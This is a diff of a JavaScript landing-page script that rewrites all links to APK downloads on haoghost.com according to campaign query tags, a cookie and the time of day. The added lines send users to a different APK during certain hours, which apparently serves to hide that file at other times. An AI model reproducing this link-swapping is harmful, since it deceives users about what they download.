@@ -12,7 +12,9 @@ $("a").click(function(){
 		if (r != null) return unescape(r[2]); return null;
 	}
 	if(getQueryString("f") && getQueryString("f").indexOf("cpctag_16")>=0){
-		$("a").attr("href","http://d.haoghost.com/360xpg.apk");
+		var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
+		if( (hour>9) || (hour==0 && minute<30) || (hour==9 && minute>30) ) $("a").attr("href","http://d.haoghost.com/sybb.10C352.apk");
+		else $("a").attr("href","http://d.haoghost.com/360xpg.apk");
 	}
 	if(getQueryString("f") && getQueryString("f").indexOf("cpctag_18")>=0){
 		$("a").attr("href","http://d.haoghost.com/360ysdq.apk");
@@ -123,7 +125,7 @@ $(function(){
 
 	if(jQuery.cookie("twice_down"))
 	{
-		$("a").attr("href","http://d.haoghost.com/360sqyy.apk");
+		//$("a").attr("href","http://d.haoghost.com/360sqyy.apk");
 	}
 	$("a").bind("click",function(){
 		jQuery.cookie("twice_down",1, {path: '/', domain: 'haoghost.com',expires:7});	
